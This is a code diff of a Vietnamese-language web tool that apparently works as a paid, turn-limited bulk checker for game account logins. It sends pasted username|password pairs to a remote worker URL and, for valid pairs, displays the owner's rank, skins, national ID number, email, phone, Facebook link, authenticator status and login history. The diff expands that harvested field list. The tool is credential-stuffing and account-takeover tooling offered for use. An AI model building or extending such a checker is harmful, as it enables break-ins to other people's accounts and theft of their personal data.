@@ -54,19 +54,45 @@
         .output-section { flex: 2; display: flex; flex-direction: column; height: 100%; }
         .result-list { flex: 1; overflow-y: auto; padding-right: 5px; display: flex; flex-direction: column; gap: 8px; }
         
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 6px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
-        ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+        /* Custom Scrollbar cho danh sách dọc */
+        .result-list::-webkit-scrollbar { width: 6px; }
+        .result-list::-webkit-scrollbar-track { background: #000; }
+        .result-list::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        .result-list::-webkit-scrollbar-thumb:hover { background: var(--primary); }
         
-        /* Result Item Card */
-        .res-item { background: #1a1d26; padding: 12px 15px; border-radius: 6px; border-left: 4px solid #555; font-family: 'Roboto Mono', monospace; font-size: 13px; display: flex; align-items: center; justify-content: space-between; animation: slideIn 0.3s ease; }
+        /* --- [CHỈNH SỬA] CSS CHO THANH CUỘN NGANG --- */
+        .res-item { 
+            background: #1a1d26; 
+            padding: 12px 15px; 
+            border-radius: 6px; 
+            border-left: 4px solid #555; 
+            font-family: 'Roboto Mono', monospace; 
+            font-size: 13px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            animation: slideIn 0.3s ease;
+            overflow: hidden; /* Giữ scrollbar bên trong */
+        }
         .res-item.success { border-left-color: var(--success); background: rgba(0, 255, 157, 0.05); }
         .res-item.error { border-left-color: var(--error); background: rgba(255, 0, 85, 0.05); color: #ff88a0; }
         
-        .res-text { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 90%; }
-        .copy-btn { background: transparent; border: 1px solid #444; color: #888; padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; }
+        /* Phần chứa text: Cho phép cuộn ngang, không xuống dòng */
+        .res-text-container {
+            flex: 1;
+            overflow-x: auto; /* Hiện thanh cuộn ngang khi cần */
+            white-space: nowrap; /* Không bao giờ xuống dòng */
+            margin-right: 10px;
+            padding-bottom: 5px; /* Tạo khoảng trống cho scrollbar đẹp hơn */
+        }
+
+        /* Tùy chỉnh thanh cuộn ngang nhỏ gọn */
+        .res-text-container::-webkit-scrollbar { height: 6px; }
+        .res-text-container::-webkit-scrollbar-track { background: #0a0b10; border-radius: 3px; }
+        .res-text-container::-webkit-scrollbar-thumb { background: #444; border-radius: 3px; }
+        .res-text-container::-webkit-scrollbar-thumb:hover { background: var(--primary); }
+
+        .copy-btn { background: transparent; border: 1px solid #444; color: #888; padding: 4px 8px; border-radius: 4px; font-size: 10px; cursor: pointer; flex-shrink: 0; }
         .copy-btn:hover { border-color: var(--primary); color: var(--primary); }
 
         .summary-bar { margin-top: 15px; padding: 15px; background: #13151b; border-radius: 8px; display: flex; justify-content: space-between; border: 1px solid var(--border); font-weight: bold; }
@@ -110,9 +136,7 @@
 
         <div class="output-section">
             <div class="glass-panel" style="padding: 0; background: transparent; border: none; box-shadow: none;">
-                <div class="result-list" id="resultContainer">
-                    </div>
-                
+                <div class="result-list" id="resultContainer"></div>
                 <div class="summary-bar">
                     <div>THÀNH CÔNG: <span id="countOk" class="sum-ok">0</span></div>
                     <div>THẤT BẠI: <span id="countFail" class="sum-fail">0</span></div>
@@ -124,39 +148,25 @@
     <script src="database.js"></script>
     <script>
         // --- CẤU HÌNH ---
-        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; // Thay link worker của bạn
+        // Thay link worker của bạn vào đây
+        const WORKER_URL = 'https://proud-art-e32c.qdev09.workers.dev/'; 
         
         let currentUser = null;
         let isRunning = false;
         let stopSignal = false;
         let stats = { ok: 0, fail: 0 };
 
-        // 1. Logic Đăng nhập (Giả lập đọc từ database.js)
         function login() {
             const id = document.getElementById('loginInput').value.trim();
             if (!VIP_DATABASE[id]) {
                 alert("❌ ID không tồn tại hoặc chưa đăng ký!");
                 return;
             }
-            
-            currentUser = {
-                id: id,
-                data: VIP_DATABASE[id] // Lấy dữ liệu từ file database.js
-            };
-
-            // Kiểm tra hạn sử dụng
-            const expiry = new Date(currentUser.data.expiry);
-            const now = new Date();
-            
-            // Logic ưu tiên: Nếu còn hạn ngày -> Không trừ lượt. Nếu hết hạn -> Trừ lượt.
-            // Nhưng theo yêu cầu của bạn: "Mỗi lần check -1 lượt".
-            // Vậy ta chỉ quan tâm đến turns.
-            
+            currentUser = { id: id, data: VIP_DATABASE[id] };
             if (currentUser.data.turns <= 0) {
                 alert("⚠️ Tài khoản đã hết lượt sử dụng (0 turns).");
                 return;
             }
-
             document.getElementById('displayId').innerText = id;
             updateTurnDisplay();
             document.getElementById('loginOverlay').style.display = 'none';
@@ -166,80 +176,87 @@
             const turnSpan = document.getElementById('displayTurns');
             const box = document.getElementById('turnBox');
             turnSpan.innerText = currentUser.data.turns;
-            
             if (currentUser.data.turns < 10) box.classList.add('danger');
             else box.classList.remove('danger');
         }
 
-        // 2. Logic Check
         async function startCheck() {
             const textArea = document.getElementById('inputList');
             let lines = textArea.value.split('\n').filter(line => line.trim() !== "");
+            if (lines.length === 0) { alert("⚠️ Danh sách trống!"); return; }
+            if (currentUser.data.turns <= 0) { alert("⛔ HẾT LƯỢT! Vui lòng nạp thêm."); return; }
 
-            if (lines.length === 0) {
-                alert("⚠️ Danh sách trống!");
-                return;
-            }
-            
-            if (currentUser.data.turns <= 0) {
-                alert("⛔ HẾT LƯỢT! Vui lòng nạp thêm.");
-                return;
-            }
-
-            // Reset trạng thái
             isRunning = true;
             stopSignal = false;
             document.getElementById('btnCheck').style.display = 'none';
             document.getElementById('btnStop').style.display = 'block';
             textArea.disabled = true;
 
-            // Vòng lặp xử lý
             for (let i = 0; i < lines.length; i++) {
                 if (stopSignal || currentUser.data.turns <= 0) break;
-
                 const line = lines[i];
-                if (!line.includes('|')) {
-                    addResult(line, "Sai định dạng", false);
-                    continue; // Bỏ qua dòng lỗi
-                }
+                if (!line.includes('|')) { addResult(line, "Sai định dạng", false); continue; }
 
                 const [user, pass] = line.split('|');
-                
-                // Gọi API
                 const result = await checkAccount(user.trim(), pass.trim());
                 
-                // Trừ lượt (Dù đúng hay sai)
                 currentUser.data.turns--;
                 updateTurnDisplay();
 
-                // Xử lý kết quả
                 if (result.status === 'success') {
-                    // Format kết quả 1 dòng
                     const d = result.data;
-                    const oneLine = `${d.username}|${d.password} | Rank: ${d.rank} | Skin: ${d.skin} | Tướng: ${d.tuong} | Login: ${d.lslogin}`;
                     
-                    addResult(oneLine, null, true);
+                    // --- [SỬA ĐỔI] CHUỖI DỮ LIỆU ĐẦY ĐỦ KHÔNG RÚT GỌN ---
+                    // Sử dụng || "null" để tránh lỗi nếu API thiếu trường
+                    const fullData = 
+`${d.username}|${d.password} | ` +
+`UID: ${d.uid || "null"} | ` +
+`NAME: ${d.name || "null"} | ` +
+`RANK: ${d.rank || "null"} | ` +
+`LEVEL: ${d.level || "null"} | ` +
+`TƯỚNG: ${d.tuong || "null"} | ` +
+`SKIN: ${d.skin || "null"} | ` +
+`QH: ${d.qh || "null"} | ` +
+`LỊCH SỬ NẠP: ${d.lsnap || "null"} | ` +
+`SÒ: ${d.so || "null"} | ` +
+`CCCD: ${d.cccd || "null"} | ` +
+`EMAIL: ${d.email || "null"} | ` +
+`AUTHEN: ${d.authen || "null"} | ` +
+`SĐT: ${d.sdt || "null"} | ` +
+`FB: ${d.fb || "null"} | ` +
+`BAND: ${d.band || "null"} | ` +
+`NGÀY ĐK: ${d.timeregacc || "null"} | ` +
+`REGION: ${d.acc_country || "null"} | ` +
+`LOGIN GẦN NHẤT: ${d.lslogin || "null"} | ` +
+`ĐỔI MAIL: ${d.change_email || "null"} | ` +
+`ĐỔI SĐT: ${d.change_sdt || "null"} | ` +
+`ĐỔI PASS: ${d.change_password || "null"} | ` +
+`SS: ${d.ss || "null"} | ` +
+`SSS: ${d.sss || "null"} | ` +
+`SKIN HIẾM: ${d.skinlimited || "null"} | ` +
+`MYSTIC: ${d.mystic || "null"} | ` +
+`S-DREAMER: ${d.sdreamer || "null"} | ` +
+`VALENTINE: ${d.valentine || "null"} | ` +
+`OTHER: ${d.other || "null"} | ` +
+`ANIME: ${d.anime || "null"} | ` +
+`AOV: ${d.aov || "null"} | ` +
+`HOẠT ĐỘNG: ${d.tshoatdong || "null"} | ` +
+`TÌNH TRẠNG: ${d.tt || "null"}`;
+
+                    addResult(fullData, null, true);
                     stats.ok++;
-                    
-                    // Xóa dòng đã check thành công khỏi textarea
-                    // Ta lấy giá trị hiện tại, remove dòng đó
                     const currentText = textArea.value;
                     const newText = currentText.replace(line + "\n", "").replace(line, ""); 
                     textArea.value = newText.trim();
                 } else {
                     addResult(`${user}|${pass}`, result.msg || "Lỗi check", false);
                     stats.fail++;
-                    // Giữ lại dòng lỗi (hoặc xóa tùy bạn, code này đang giữ lại dòng lỗi để user biết sai con nào)
                 }
 
-                // Cập nhật thống kê
                 document.getElementById('countOk').innerText = stats.ok;
                 document.getElementById('countFail').innerText = stats.fail;
-
-                // Delay nhẹ để không spam server
                 await new Promise(r => setTimeout(r, 500));
             }
-
             stopCheck();
         }
 
@@ -251,9 +268,7 @@
                     body: JSON.stringify({ account, password })
                 });
                 return await response.json();
-            } catch (e) {
-                return { status: 'error', msg: "Lỗi mạng/API" };
-            }
+            } catch (e) { return { status: 'error', msg: "Lỗi mạng/API" }; }
         }
 
         function stopCheck() {
@@ -262,13 +277,9 @@
             document.getElementById('btnCheck').style.display = 'block';
             document.getElementById('btnStop').style.display = 'none';
             document.getElementById('inputList').disabled = false;
-            
-            if (currentUser.data.turns <= 0) {
-                alert("⚠️ Đã hết lượt sử dụng. Dừng tool.");
-            }
+            if (currentUser.data.turns <= 0) alert("⚠️ Đã hết lượt sử dụng.");
         }
 
-        // 3. Hiển thị kết quả
         function addResult(text, errorMsg, isSuccess) {
             const container = document.getElementById('resultContainer');
             const div = document.createElement('div');
@@ -276,12 +287,12 @@
             
             const content = isSuccess ? text : `${text} -> [${errorMsg}]`;
             
+            // Cấu trúc mới: Container scroll ngang bao quanh text
             div.innerHTML = `
-                <div class="res-text" title="${content}">${content}</div>
-                <button class="copy-btn" onclick="navigator.clipboard.writeText('${content}')">COPY</button>
+                <div class="res-text-container" title="${content}">${content}</div>
+                <button class="copy-btn" onclick="navigator.clipboard.writeText(\`${content}\`)">COPY</button>
             `;
             
-            // Thêm vào đầu danh sách
             container.insertBefore(div, container.firstChild);
         }
     </script>
